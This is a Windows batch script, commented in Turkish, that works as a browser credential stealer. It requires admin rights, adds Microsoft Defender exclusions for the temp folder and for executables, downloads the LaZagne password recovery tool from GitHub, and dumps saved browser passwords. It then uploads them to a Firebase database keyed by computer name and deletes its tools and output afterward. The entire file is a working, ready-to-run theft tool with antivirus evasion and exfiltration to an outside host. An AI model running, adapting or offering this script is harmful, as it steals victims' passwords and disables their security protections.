@echo off
:: Step 1: Yönetici kontrolü
net session >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [+] Bu scriptin çalışması için yönetici izni gerekiyor!
    echo Lütfen scripti yönetici olarak çalıştırın.
    pause
    exit
)

:: Step 2: Log dosyası oluştur
set LOGFILE=%TEMP%\browser_steal_log.txt
echo [%DATE% %TIME%] Script başlatıldı > "%LOGFILE%"

:: Step 3: Çalışma dizinine geç
cd /d %TEMP%
echo [%DATE% %TIME%] Çalışma dizini: %CD% >> "%LOGFILE%"

:: Step 4: Eski dosyaları sil
if exist lazagne.exe (
    echo [%DATE% %TIME%] Eski lazagne.exe siliniyor... >> "%LOGFILE%"
    del /f /q lazagne.exe >nul 2>&1
)
if exist results (
    echo [%DATE% %TIME%] Eski results klasörü siliniyor... >> "%LOGFILE%"
    rd /s /q results >nul 2>&1
)

:: Step 5: Defender исключение ekle (minimal)
echo [%DATE% %TIME%] Defender için исключение ekleniyor... >> "%LOGFILE%"
powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%' -ExclusionProcess 'lazagne.exe' -ExclusionExtension 'exe'" >nul 2>&1

:: Step 6: Lazagne indir
echo [%DATE% %TIME%] Lazagne indiriliyor... >> "%LOGFILE%"
curl -L -o lazagne.exe https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [%DATE% %TIME%] HATA: Curl indirme başarısız, PowerShell ile deneniyor... >> "%LOGFILE%"
    powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe' -OutFile 'lazagne.exe' } catch { Write-Output ('HATA: PowerShell indirme başarısız: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append }" >nul 2>&1
    if %ERRORLEVEL% neq 0 (
        echo [%DATE% %TIME%] HATA: PowerShell indirme de başarısız! >> "%LOGFILE%"
        echo [+] Dosya indirilemedi, lütfen internet bağlantısını kontrol edin.
        goto :cleanup
    )
)

:: Step 7: lazagne.exe dosyasını kontrol et
if exist lazagne.exe (
    for %%F in (lazagne.exe) do (
        if %%~zF LSS 1000 (
            echo [%DATE% %TIME%] HATA: lazagne.exe bozuk veya boş (%%~zF bayt)! >> "%LOGFILE%"
            del /f /q lazagne.exe >nul 2>&1
            echo [+] lazagne.exe bozuk, lütfen tekrar deneyin.
            goto :cleanup
        )
    )
    echo [%DATE% %TIME%] lazagne.exe başarıyla indirildi. >> "%LOGFILE%"
) else (
    echo [%DATE% %TIME%] HATA: lazagne.exe indirilemedi! >> "%LOGFILE%"
    echo [+] lazagne.exe indirilemedi, lütfen bağlantıyı kontrol edin.
    goto :cleanup
)

:: Step 8: Şifreleri topla
echo [%DATE% %TIME%] Şifreler toplanıyor... >> "%LOGFILE%"
lazagne.exe browsers -oN -output results >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [%DATE% %TIME%] HATA: lazagne.exe çalıştırılamadı! >> "%LOGFILE%"
    echo [+] Şifre toplama başarısız, lütfen dosyayı kontrol edin.
    goto :cleanup
)

:: Step 9: Firebase’e veri gönder
set LOGFILE=results\browsers.txt
set DATA=

if exist "%LOGFILE%" (
    echo [%DATE% %TIME%] browsers.txt bulundu, işleniyor... >> "%LOGFILE%"
    setlocal EnableDelayedExpansion
    for /f "usebackq delims=" %%A in ("%LOGFILE%") do (
        set "line=%%A"
        set "line=!line:\=\\!"
        set "line=!line:"=\\\"!"
        set "line=!line:^|=\\|!"
        set "line=!line:^&=\\&!"
        set "line=!line:^^=\\^!"
        set "line=!line:
=\\n!"
        set "DATA=!DATA!!line!\\n"
    )
    endlocal & set DATA=%DATA%
) else (
    echo [%DATE% %TIME%] HATA: browsers.txt bulunamadı! >> "%LOGFILE%"
    set DATA=NoDataCollected
)

:: Firebase URL with /credentials/%COMPUTERNAME%
set FB=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials/%COMPUTERNAME%.json
echo [%DATE% %TIME%] Firebase URL: %FB% >> "%LOGFILE%"

echo [%DATE% %TIME%] Firebase’e veri gönderiliyor... >> "%LOGFILE%"
powershell -Command ^
  "try { $json = '{\"log\":\"%DATA%\"}'; Invoke-RestMethod -Uri '%FB%' -Method PATCH -Body $json -ContentType 'application/json' } catch { Write-Output ('HATA: Firebase gönderim başarısız: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append }" >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [%DATE% %TIME%] HATA: Firebase gönderim başarısız! >> "%LOGFILE%"
    echo [+] Firebase’e veri gönderilemedi, log dosyasını kontrol edin.
)

:: Step 10: Temizlik
:cleanup
echo [%DATE% %TIME%] Temizlik yapılıyor... >> "%LOGFILE%"
if exist lazagne.exe del /f /q lazagne.exe >nul 2>&1
if exist results rd /s /q results >nul 2>&1

echo [%DATE% %TIME%] İşlem tamamlandı, çıkılıyor... >> "%LOGFILE%"
echo [+] İşlem tamamlandı, çıkılıyor...
timeout /t 3 >nul
exit
